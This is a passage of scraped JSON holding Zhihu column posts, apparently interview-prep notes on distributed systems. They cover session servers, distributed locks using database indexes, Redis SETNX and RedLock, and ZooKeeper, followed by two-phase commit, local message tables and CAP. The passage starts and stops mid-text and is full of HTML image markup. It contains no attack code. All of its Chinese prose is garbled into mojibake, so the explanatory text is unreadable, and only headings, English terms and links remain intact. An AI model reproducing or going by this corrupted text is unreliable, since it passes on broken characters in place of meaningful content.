data-size=\"normal\" data-rawwidth=\"701\" data-rawheight=\"683\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"701\" data-original=\"https://pic2.zhimg.com/v2-83a40112583526f55e3a9f87f9400d41_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-83a40112583526f55e3a9f87f9400d41_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>Session Server</h2><p>ä½¿ç”¨ä¸€ä¸ªå•ç‹¬çš„æœåŠ¡å™¨å­˜å‚¨ Session æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨ä¼ ç»Ÿçš„ MySQLï¼Œä¹Ÿä½¿ç”¨ Redis æˆ–è€… Memcached è¿™ç§å†…å­˜å‹æ•°æ®åº“ã€‚</p><p>ä¼˜ç‚¹ï¼š</p><ul><li>ä¸ºäº†ä½¿å¾—å¤§å‹ç½‘ç«™å…·æœ‰ä¼¸ç¼©æ€§ï¼Œé›†ç¾¤ä¸­çš„åº”ç”¨æœåŠ¡å™¨é€šå¸¸éœ€è¦ä¿æŒæ— çŠ¶æ€ï¼Œé‚£ä¹ˆåº”ç”¨æœåŠ¡å™¨ä¸èƒ½å­˜å‚¨ç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯ã€‚Session Server å°†ç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯å•ç‹¬è¿›è¡Œå­˜å‚¨ï¼Œä»è€Œä¿è¯äº†åº”ç”¨æœåŠ¡å™¨çš„æ— çŠ¶æ€ã€‚</li></ul><p>ç¼ºç‚¹ï¼š</p><ul><li>éœ€è¦å»å®ç°å­˜å– Session çš„ä»£ç ã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-7ad85df981c5f5ad0b6ea20f73f766ae_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1046\" data-rawheight=\"547\" class=\"origin_image zh-lightbox-thumb\" width=\"1046\" data-original=\"https://pic3.zhimg.com/v2-7ad85df981c5f5ad0b6ea20f73f766ae_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1046&#39; height=&#39;547&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1046\" data-rawheight=\"547\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1046\" data-original=\"https://pic3.zhimg.com/v2-7ad85df981c5f5ad0b6ea20f73f766ae_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-7ad85df981c5f5ad0b6ea20f73f766ae_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>å‚è€ƒï¼š</p><ul><li><a href=\"https://link.zhihu.com/?target=https%3A//sivalabs.in/2018/02/session-management-using-spring-session-jdbc-datastore/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Session Management using Spring Session with JDBC DataStore</a></li></ul><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"354\" class=\"origin_image zh-lightbox-thumb\" width=\"937\" data-original=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;937&#39; height=&#39;354&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"354\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"937\" data-original=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_b.jpg\"/></figure><p></p>", 
            "topic": [
                {
                    "tag": "é›†ç¾¤", 
                    "tagLink": "https://api.zhihu.com/topics/19596215"
                }, 
                {
                    "tag": "é¢è¯•", 
                    "tagLink": "https://api.zhihu.com/topics/19552079"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/68500828", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 2, 
            "title": "åˆ†å¸ƒå¼", 
            "content": "<p></p><h2>ä¸€ã€åˆ†å¸ƒå¼é”</h2><p>åœ¨å•æœºåœºæ™¯ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨è¯­è¨€çš„å†…ç½®é”æ¥å®ç°è¿›ç¨‹åŒæ­¥ã€‚ä½†æ˜¯åœ¨åˆ†å¸ƒå¼åœºæ™¯ä¸‹ï¼Œéœ€è¦åŒæ­¥çš„è¿›ç¨‹å¯èƒ½ä½äºä¸åŒçš„èŠ‚ç‚¹ä¸Šï¼Œé‚£ä¹ˆå°±éœ€è¦ä½¿ç”¨åˆ†å¸ƒå¼é”ã€‚</p><p>é˜»å¡é”é€šå¸¸ä½¿ç”¨äº’æ–¥é‡æ¥å®ç°ï¼š</p><ul><li>äº’æ–¥é‡ä¸º 0 è¡¨ç¤ºæœ‰å…¶å®ƒè¿›ç¨‹åœ¨ä½¿ç”¨é”ï¼Œæ­¤æ—¶å¤„äºé”å®šçŠ¶æ€ï¼›</li><li>äº’æ–¥é‡ä¸º 1 è¡¨ç¤ºæœªé”å®šçŠ¶æ€ã€‚</li></ul><p>1 å’Œ 0 å¯ä»¥ç”¨ä¸€ä¸ªæ•´å‹å€¼è¡¨ç¤ºï¼Œä¹Ÿå¯ä»¥ç”¨æŸä¸ªæ•°æ®æ˜¯å¦å­˜åœ¨è¡¨ç¤ºã€‚</p><h2>æ•°æ®åº“çš„å”¯ä¸€ç´¢å¼•</h2><p>è·å¾—é”æ—¶å‘è¡¨ä¸­æ’å…¥ä¸€æ¡è®°å½•ï¼Œé‡Šæ”¾é”æ—¶åˆ é™¤è¿™æ¡è®°å½•ã€‚å”¯ä¸€ç´¢å¼•å¯ä»¥ä¿è¯è¯¥è®°å½•åªè¢«æ’å…¥ä¸€æ¬¡ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç”¨è¿™ä¸ªè®°å½•æ˜¯å¦å­˜åœ¨æ¥åˆ¤æ–­æ˜¯å¦å­˜äºé”å®šçŠ¶æ€ã€‚</p><p>å­˜åœ¨ä»¥ä¸‹å‡ ä¸ªé—®é¢˜ï¼š</p><ul><li>é”æ²¡æœ‰å¤±æ•ˆæ—¶é—´ï¼Œè§£é”å¤±è´¥çš„è¯å…¶å®ƒè¿›ç¨‹æ— æ³•å†è·å¾—è¯¥é”ã€‚</li><li>åªèƒ½æ˜¯éé˜»å¡é”ï¼Œæ’å…¥å¤±è´¥ç›´æ¥å°±æŠ¥é”™äº†ï¼Œæ— æ³•é‡è¯•ã€‚</li><li>ä¸å¯é‡å…¥ï¼Œå·²ç»è·å¾—é”çš„è¿›ç¨‹ä¹Ÿå¿…é¡»é‡æ–°è·å–é”ã€‚</li></ul><h2>Redis çš„ SETNX æŒ‡ä»¤</h2><p>ä½¿ç”¨ SETNXï¼ˆset if not existï¼‰æŒ‡ä»¤æ’å…¥ä¸€ä¸ªé”®å€¼å¯¹ï¼Œå¦‚æœ Key å·²ç»å­˜åœ¨ï¼Œé‚£ä¹ˆä¼šè¿”å› Falseï¼Œå¦åˆ™æ’å…¥æˆåŠŸå¹¶è¿”å› Trueã€‚</p><p>SETNX æŒ‡ä»¤å’Œæ•°æ®åº“çš„å”¯ä¸€ç´¢å¼•ç±»ä¼¼ï¼Œä¿è¯äº†åªå­˜åœ¨ä¸€ä¸ª Key çš„é”®å€¼å¯¹ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨ä¸€ä¸ª Key çš„é”®å€¼å¯¹æ˜¯å¦å­˜åœ¨æ¥åˆ¤æ–­æ˜¯å¦å­˜äºé”å®šçŠ¶æ€ã€‚</p><p>EXPIRE æŒ‡ä»¤å¯ä»¥ä¸ºä¸€ä¸ªé”®å€¼å¯¹è®¾ç½®ä¸€ä¸ªè¿‡æœŸæ—¶é—´ï¼Œä»è€Œé¿å…äº†æ•°æ®åº“å”¯ä¸€ç´¢å¼•å®ç°æ–¹å¼ä¸­é‡Šæ”¾é”å¤±è´¥çš„é—®é¢˜ã€‚</p><h2>Redis çš„ RedLock ç®—æ³•</h2><p>ä½¿ç”¨äº†å¤šä¸ª Redis å®ä¾‹æ¥å®ç°åˆ†å¸ƒå¼é”ï¼Œè¿™æ˜¯ä¸ºäº†ä¿è¯åœ¨å‘ç”Ÿå•ç‚¹æ•…éšœæ—¶ä»ç„¶å¯ç”¨ã€‚</p><ul><li>å°è¯•ä» N ä¸ªäº’ç›¸ç‹¬ç«‹ Redis å®ä¾‹è·å–é”ï¼›</li><li>è®¡ç®—è·å–é”æ¶ˆè€—çš„æ—¶é—´ï¼Œåªæœ‰å½“è¿™ä¸ªæ—¶é—´å°äºé”çš„è¿‡æœŸæ—¶é—´ï¼Œå¹¶ä¸”ä»å¤§å¤šæ•°ï¼ˆN / 2 + 1ï¼‰å®ä¾‹ä¸Šè·å–äº†é”ï¼Œé‚£ä¹ˆå°±è®¤ä¸ºé”è·å–æˆåŠŸäº†ï¼›</li><li>å¦‚æœé”è·å–å¤±è´¥ï¼Œå°±åˆ°æ¯ä¸ªå®ä¾‹ä¸Šé‡Šæ”¾é”ã€‚</li></ul><h2>Zookeeper çš„æœ‰åºèŠ‚ç‚¹</h2><h3>1. Zookeeper æŠ½è±¡æ¨¡å‹</h3><p>Zookeeper æä¾›äº†ä¸€ç§æ ‘å½¢ç»“æ„çš„å‘½åç©ºé—´ï¼Œ/app1/p_1 èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ä¸º /app1ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-46b1745f183af70652fb8355481cda0b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"566\" data-rawheight=\"434\" class=\"origin_image zh-lightbox-thumb\" width=\"566\" data-original=\"https://pic4.zhimg.com/v2-46b1745f183af70652fb8355481cda0b_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;566&#39; height=&#39;434&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"566\" data-rawheight=\"434\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"566\" data-original=\"https://pic4.zhimg.com/v2-46b1745f183af70652fb8355481cda0b_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-46b1745f183af70652fb8355481cda0b_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>2. èŠ‚ç‚¹ç±»å‹</h3><ul><li>æ°¸ä¹…èŠ‚ç‚¹ï¼šä¸ä¼šå› ä¸ºä¼šè¯ç»“æŸæˆ–è€…è¶…æ—¶è€Œæ¶ˆå¤±ï¼›</li><li>ä¸´æ—¶èŠ‚ç‚¹ï¼šå¦‚æœä¼šè¯ç»“æŸæˆ–è€…è¶…æ—¶å°±ä¼šæ¶ˆå¤±ï¼›</li><li>æœ‰åºèŠ‚ç‚¹ï¼šä¼šåœ¨èŠ‚ç‚¹åçš„åé¢åŠ ä¸€ä¸ªæ•°å­—åç¼€ï¼Œå¹¶ä¸”æ˜¯æœ‰åºçš„ï¼Œä¾‹å¦‚ç”Ÿæˆçš„æœ‰åºèŠ‚ç‚¹ä¸º /lock/node-0000000000ï¼Œå®ƒçš„ä¸‹ä¸€ä¸ªæœ‰åºèŠ‚ç‚¹åˆ™ä¸º /lock/node-0000000001ï¼Œä»¥æ­¤ç±»æ¨ã€‚</li></ul><h3>3. ç›‘å¬å™¨</h3><p>ä¸ºä¸€ä¸ªèŠ‚ç‚¹æ³¨å†Œç›‘å¬å™¨ï¼Œåœ¨èŠ‚ç‚¹çŠ¶æ€å‘ç”Ÿæ”¹å˜æ—¶ï¼Œä¼šç»™å®¢æˆ·ç«¯å‘é€æ¶ˆæ¯ã€‚</p><h3>4. åˆ†å¸ƒå¼é”å®ç°</h3><ul><li>åˆ›å»ºä¸€ä¸ªé”ç›®å½• /lockï¼›</li><li>å½“ä¸€ä¸ªå®¢æˆ·ç«¯éœ€è¦è·å–é”æ—¶ï¼Œåœ¨ /lock ä¸‹åˆ›å»ºä¸´æ—¶çš„ä¸”æœ‰åºçš„å­èŠ‚ç‚¹ï¼›</li><li>å®¢æˆ·ç«¯è·å– /lock ä¸‹çš„å­èŠ‚ç‚¹åˆ—è¡¨ï¼Œåˆ¤æ–­è‡ªå·±åˆ›å»ºçš„å­èŠ‚ç‚¹æ˜¯å¦ä¸ºå½“å‰å­èŠ‚ç‚¹åˆ—è¡¨ä¸­åºå·æœ€å°çš„å­èŠ‚ç‚¹ï¼Œå¦‚æœæ˜¯åˆ™è®¤ä¸ºè·å¾—é”ï¼›å¦åˆ™ç›‘å¬è‡ªå·±çš„å‰ä¸€ä¸ªå­èŠ‚ç‚¹ï¼Œè·å¾—å­èŠ‚ç‚¹çš„å˜æ›´é€šçŸ¥åé‡å¤æ­¤æ­¥éª¤ç›´è‡³è·å¾—é”ï¼›</li><li>æ‰§è¡Œä¸šåŠ¡ä»£ç ï¼Œå®Œæˆåï¼Œåˆ é™¤å¯¹åº”çš„å­èŠ‚ç‚¹ã€‚</li></ul><h3>5. ä¼šè¯è¶…æ—¶</h3><p>å¦‚æœä¸€ä¸ªå·²ç»è·å¾—é”çš„ä¼šè¯è¶…æ—¶äº†ï¼Œå› ä¸ºåˆ›å»ºçš„æ˜¯ä¸´æ—¶èŠ‚ç‚¹ï¼Œæ‰€ä»¥è¯¥ä¼šè¯å¯¹åº”çš„ä¸´æ—¶èŠ‚ç‚¹ä¼šè¢«åˆ é™¤ï¼Œå…¶å®ƒä¼šè¯å°±å¯ä»¥è·å¾—é”äº†ã€‚å¯ä»¥çœ‹åˆ°ï¼ŒZookeeper åˆ†å¸ƒå¼é”ä¸ä¼šå‡ºç°æ•°æ®åº“çš„å”¯ä¸€ç´¢å¼•å®ç°çš„åˆ†å¸ƒå¼é”é‡Šæ”¾é”å¤±è´¥é—®é¢˜ã€‚</p><h3>6. ç¾Šç¾¤æ•ˆåº”</h3><p>ä¸€ä¸ªèŠ‚ç‚¹æœªè·å¾—é”ï¼Œåªéœ€è¦ç›‘å¬è‡ªå·±çš„å‰ä¸€ä¸ªå­èŠ‚ç‚¹ï¼Œè¿™æ˜¯å› ä¸ºå¦‚æœç›‘å¬æ‰€æœ‰çš„å­èŠ‚ç‚¹ï¼Œé‚£ä¹ˆä»»æ„ä¸€ä¸ªå­èŠ‚ç‚¹çŠ¶æ€æ”¹å˜ï¼Œå…¶å®ƒæ‰€æœ‰å­èŠ‚ç‚¹éƒ½ä¼šæ”¶åˆ°é€šçŸ¥ï¼ˆç¾Šç¾¤æ•ˆåº”ï¼‰ï¼Œè€Œæˆ‘ä»¬åªå¸Œæœ›å®ƒçš„åä¸€ä¸ªå­èŠ‚ç‚¹æ”¶åˆ°é€šçŸ¥ã€‚</p><h2>äºŒã€åˆ†å¸ƒå¼äº‹åŠ¡</h2><p>æŒ‡äº‹åŠ¡çš„æ“ä½œä½äºä¸åŒçš„èŠ‚ç‚¹ä¸Šï¼Œéœ€è¦ä¿è¯äº‹åŠ¡çš„ ACID ç‰¹æ€§ã€‚</p><p>ä¾‹å¦‚åœ¨ä¸‹å•åœºæ™¯ä¸‹ï¼Œåº“å­˜å’Œè®¢å•å¦‚æœä¸åœ¨åŒä¸€ä¸ªèŠ‚ç‚¹ä¸Šï¼Œå°±æ¶‰åŠåˆ†å¸ƒå¼äº‹åŠ¡ã€‚</p><h2>2PC</h2><p>ä¸¤é˜¶æ®µæäº¤ï¼ˆTwo-phase Commitï¼Œ2PCï¼‰ï¼Œé€šè¿‡å¼•å…¥åè°ƒè€…ï¼ˆCoordinatorï¼‰æ¥åè°ƒå‚ä¸è€…çš„è¡Œä¸ºï¼Œå¹¶æœ€ç»ˆå†³å®šè¿™äº›å‚ä¸è€…æ˜¯å¦è¦çœŸæ­£æ‰§è¡Œäº‹åŠ¡ã€‚</p><h3>1. è¿è¡Œè¿‡ç¨‹</h3><h3>1.1 å‡†å¤‡é˜¶æ®µ</h3><p>åè°ƒè€…è¯¢é—®å‚ä¸è€…äº‹åŠ¡æ˜¯å¦æ‰§è¡ŒæˆåŠŸï¼Œå‚ä¸è€…å‘å›äº‹åŠ¡æ‰§è¡Œç»“æœã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-cb9e81a4c9f8f95514ac62171605475a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1006\" data-rawheight=\"366\" class=\"origin_image zh-lightbox-thumb\" width=\"1006\" data-original=\"https://pic3.zhimg.com/v2-cb9e81a4c9f8f95514ac62171605475a_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1006&#39; height=&#39;366&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1006\" data-rawheight=\"366\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1006\" data-original=\"https://pic3.zhimg.com/v2-cb9e81a4c9f8f95514ac62171605475a_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-cb9e81a4c9f8f95514ac62171605475a_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>1.2 æäº¤é˜¶æ®µ</h3><p>å¦‚æœäº‹åŠ¡åœ¨æ¯ä¸ªå‚ä¸è€…ä¸Šéƒ½æ‰§è¡ŒæˆåŠŸï¼Œäº‹åŠ¡åè°ƒè€…å‘é€é€šçŸ¥è®©å‚ä¸è€…æäº¤äº‹åŠ¡ï¼›å¦åˆ™ï¼Œåè°ƒè€…å‘é€é€šçŸ¥è®©å‚ä¸è€…å›æ»šäº‹åŠ¡ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨å‡†å¤‡é˜¶æ®µï¼Œå‚ä¸è€…æ‰§è¡Œäº†äº‹åŠ¡ï¼Œä½†æ˜¯è¿˜æœªæäº¤ã€‚åªæœ‰åœ¨æäº¤é˜¶æ®µæ¥æ”¶åˆ°åè°ƒè€…å‘æ¥çš„é€šçŸ¥åï¼Œæ‰è¿›è¡Œæäº¤æˆ–è€…å›æ»šã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-c2b0eba5c21dd924b536ee28c75b20fe_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"996\" data-rawheight=\"360\" class=\"origin_image zh-lightbox-thumb\" width=\"996\" data-original=\"https://pic3.zhimg.com/v2-c2b0eba5c21dd924b536ee28c75b20fe_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;996&#39; height=&#39;360&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"996\" data-rawheight=\"360\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"996\" data-original=\"https://pic3.zhimg.com/v2-c2b0eba5c21dd924b536ee28c75b20fe_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-c2b0eba5c21dd924b536ee28c75b20fe_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>2. å­˜åœ¨çš„é—®é¢˜</h3><h3>2.1 åŒæ­¥é˜»å¡</h3><p>æ‰€æœ‰äº‹åŠ¡å‚ä¸è€…åœ¨ç­‰å¾…å…¶å®ƒå‚ä¸è€…å“åº”çš„æ—¶å€™éƒ½å¤„äºåŒæ­¥é˜»å¡çŠ¶æ€ï¼Œæ— æ³•è¿›è¡Œå…¶å®ƒæ“ä½œã€‚</p><h3>2.2 å•ç‚¹é—®é¢˜</h3><p>åè°ƒè€…åœ¨ 2PC ä¸­èµ·åˆ°éå¸¸å¤§çš„ä½œç”¨ï¼Œå‘ç”Ÿæ•…éšœå°†ä¼šé€ æˆå¾ˆå¤§å½±å“ã€‚ç‰¹åˆ«æ˜¯åœ¨é˜¶æ®µäºŒå‘ç”Ÿæ•…éšœï¼Œæ‰€æœ‰å‚ä¸è€…ä¼šä¸€ç›´ç­‰å¾…ï¼Œæ— æ³•å®Œæˆå…¶å®ƒæ“ä½œã€‚</p><h3>2.3 æ•°æ®ä¸ä¸€è‡´</h3><p>åœ¨é˜¶æ®µäºŒï¼Œå¦‚æœåè°ƒè€…åªå‘é€äº†éƒ¨åˆ† Commit æ¶ˆæ¯ï¼Œæ­¤æ—¶ç½‘ç»œå‘ç”Ÿå¼‚å¸¸ï¼Œé‚£ä¹ˆåªæœ‰éƒ¨åˆ†å‚ä¸è€…æ¥æ”¶åˆ° Commit æ¶ˆæ¯ï¼Œä¹Ÿå°±æ˜¯è¯´åªæœ‰éƒ¨åˆ†å‚ä¸è€…æäº¤äº†äº‹åŠ¡ï¼Œä½¿å¾—ç³»ç»Ÿæ•°æ®ä¸ä¸€è‡´ã€‚</p><h3>2.4 å¤ªè¿‡ä¿å®ˆ</h3><p>ä»»æ„ä¸€ä¸ªèŠ‚ç‚¹å¤±è´¥å°±ä¼šå¯¼è‡´æ•´ä¸ªäº‹åŠ¡å¤±è´¥ï¼Œæ²¡æœ‰å®Œå–„çš„å®¹é”™æœºåˆ¶ã€‚</p><h2>æœ¬åœ°æ¶ˆæ¯è¡¨</h2><p>æœ¬åœ°æ¶ˆæ¯è¡¨ä¸ä¸šåŠ¡æ•°æ®è¡¨å¤„äºåŒä¸€ä¸ªæ•°æ®åº“ä¸­ï¼Œè¿™æ ·å°±èƒ½åˆ©ç”¨æœ¬åœ°äº‹åŠ¡æ¥ä¿è¯åœ¨å¯¹è¿™ä¸¤ä¸ªè¡¨çš„æ“ä½œæ»¡è¶³äº‹åŠ¡ç‰¹æ€§ï¼Œå¹¶ä¸”ä½¿ç”¨äº†æ¶ˆæ¯é˜Ÿåˆ—æ¥ä¿è¯æœ€ç»ˆä¸€è‡´æ€§ã€‚</p><ol><li>åœ¨åˆ†å¸ƒå¼äº‹åŠ¡æ“ä½œçš„ä¸€æ–¹å®Œæˆå†™ä¸šåŠ¡æ•°æ®çš„æ“ä½œä¹‹åå‘æœ¬åœ°æ¶ˆæ¯è¡¨å‘é€ä¸€ä¸ªæ¶ˆæ¯ï¼Œæœ¬åœ°äº‹åŠ¡èƒ½ä¿è¯è¿™ä¸ªæ¶ˆæ¯ä¸€å®šä¼šè¢«å†™å…¥æœ¬åœ°æ¶ˆæ¯è¡¨ä¸­ã€‚</li><li>ä¹‹åå°†æœ¬åœ°æ¶ˆæ¯è¡¨ä¸­çš„æ¶ˆæ¯è½¬å‘åˆ°æ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œå¦‚æœè½¬å‘æˆåŠŸåˆ™å°†æ¶ˆæ¯ä»æœ¬åœ°æ¶ˆæ¯è¡¨ä¸­åˆ é™¤ï¼Œå¦åˆ™ç»§ç»­é‡æ–°è½¬å‘ã€‚</li><li>åœ¨åˆ†å¸ƒå¼äº‹åŠ¡æ“ä½œçš„å¦ä¸€æ–¹ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è¯»å–ä¸€ä¸ªæ¶ˆæ¯ï¼Œå¹¶æ‰§è¡Œæ¶ˆæ¯ä¸­çš„æ“ä½œã€‚</li></ol><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-8836bd7f0a76edbee12cfbbc87728db7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1258\" data-rawheight=\"459\" class=\"origin_image zh-lightbox-thumb\" width=\"1258\" data-original=\"https://pic4.zhimg.com/v2-8836bd7f0a76edbee12cfbbc87728db7_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1258&#39; height=&#39;459&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1258\" data-rawheight=\"459\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1258\" data-original=\"https://pic4.zhimg.com/v2-8836bd7f0a76edbee12cfbbc87728db7_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-8836bd7f0a76edbee12cfbbc87728db7_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>ä¸‰ã€CAP</h2><p>åˆ†å¸ƒå¼ç³»ç»Ÿä¸å¯èƒ½åŒæ—¶æ»¡è¶³ä¸€è‡´æ€§ï¼ˆCï¼šConsistencyï¼‰ã€å¯ç”¨æ€§ï¼ˆAï¼šAvailabilityï¼‰å’Œåˆ†åŒºå®¹å¿æ€§ï¼ˆPï¼šPartition Toleranceï¼‰ï¼Œæœ€å¤šåªèƒ½åŒæ—¶æ»¡è¶³å…¶ä¸­ä¸¤é¡¹ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-5a8d572e401dd09dceaa9bb2d7b05a7c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"683\" data-rawheight=\"734\" class=\"origin_image zh-lightbox-thumb\" width=\"683\" data-original=\"https://pic1.zhimg.com/v2-5a8d572e401dd09dceaa9bb2d7b05a7c_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;683&#39; height=&#39;734&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"683\" data-rawheight=\"734\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"683\" data-original=\"https://pic1.zhimg.com/v2-5a8d572e401dd09dceaa9bb2d7b05a7c_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-5a8d572e401dd09dceaa9bb2d7b05a7c_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>ä¸€è‡´æ€§</h2><p>ä¸€è‡´æ€§æŒ‡çš„æ˜¯å¤šä¸ªæ•°æ®å‰¯æœ¬æ˜¯å¦èƒ½ä¿æŒä¸€è‡´çš„ç‰¹æ€§ï¼Œåœ¨ä¸€è‡´æ€§çš„æ¡ä»¶ä¸‹ï¼Œç³»ç»Ÿåœ¨æ‰§è¡Œæ•°æ®æ›´æ–°æ“ä½œä¹‹åèƒ½å¤Ÿä»ä¸€è‡´æ€§çŠ¶æ€è½¬ç§»åˆ°å¦ä¸€ä¸ªä¸€è‡´æ€§çŠ¶æ€ã€‚</p><p>å¯¹ç³»ç»Ÿçš„ä¸€ä¸ªæ•°æ®æ›´æ–°æˆåŠŸä¹‹åï¼Œå¦‚æœæ‰€æœ‰ç”¨æˆ·éƒ½èƒ½å¤Ÿè¯»å–åˆ°æœ€æ–°çš„å€¼ï¼Œè¯¥ç³»ç»Ÿå°±è¢«è®¤ä¸ºå…·æœ‰å¼ºä¸€è‡´æ€§ã€‚</p><h2>å¯ç”¨æ€§</h2><p>å¯ç”¨æ€§æŒ‡åˆ†å¸ƒå¼ç³»ç»Ÿåœ¨é¢å¯¹å„ç§å¼‚å¸¸æ—¶å¯ä»¥æä¾›æ­£å¸¸æœåŠ¡çš„èƒ½åŠ›ï¼Œå¯ä»¥ç”¨ç³»ç»Ÿå¯ç”¨æ—¶é—´å æ€»æ—¶é—´çš„æ¯”å€¼æ¥è¡¡é‡ï¼Œ4 ä¸ª 9 çš„å¯ç”¨æ€§è¡¨ç¤ºç³»ç»Ÿ 99.99% çš„æ—¶é—´æ˜¯å¯ç”¨çš„ã€‚</p><p>åœ¨å¯ç”¨æ€§æ¡ä»¶ä¸‹ï¼Œè¦æ±‚ç³»ç»Ÿæä¾›çš„æœåŠ¡ä¸€ç›´å¤„äºå¯ç”¨çš„çŠ¶æ€ï¼Œå¯¹äºç”¨æˆ·çš„æ¯ä¸€ä¸ªæ“ä½œè¯·æ±‚æ€»æ˜¯èƒ½å¤Ÿåœ¨æœ‰é™çš„æ—¶é—´å†…è¿”å›ç»“æœã€‚</p><h2>åˆ†åŒºå®¹å¿æ€§</h2><p>ç½‘ç»œåˆ†åŒºæŒ‡åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„èŠ‚ç‚¹è¢«åˆ’åˆ†ä¸ºå¤šä¸ªåŒºåŸŸï¼Œæ¯ä¸ªåŒºåŸŸå†…éƒ¨å¯ä»¥é€šä¿¡ï¼Œä½†æ˜¯åŒºåŸŸä¹‹é—´æ— æ³•é€šä¿¡ã€‚</p><p>åœ¨åˆ†åŒºå®¹å¿æ€§æ¡ä»¶ä¸‹ï¼Œåˆ†å¸ƒå¼ç³»ç»Ÿåœ¨é‡åˆ°ä»»ä½•ç½‘ç»œåˆ†åŒºæ•…éšœçš„æ—¶å€™ï¼Œä»ç„¶éœ€è¦èƒ½å¯¹å¤–æä¾›ä¸€è‡´æ€§å’Œå¯ç”¨æ€§çš„æœåŠ¡ï¼Œé™¤éæ˜¯æ•´ä¸ªç½‘ç»œç¯å¢ƒéƒ½å‘ç”Ÿäº†æ•…éšœã€‚</p><h2>æƒè¡¡</h2><p>åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œåˆ†åŒºå®¹å¿æ€§å¿…ä¸å¯å°‘ï¼Œå› ä¸ºéœ€è¦æ€»æ˜¯å‡è®¾ç½‘ç»œæ˜¯ä¸å¯é çš„ã€‚å› æ­¤ï¼ŒCAP 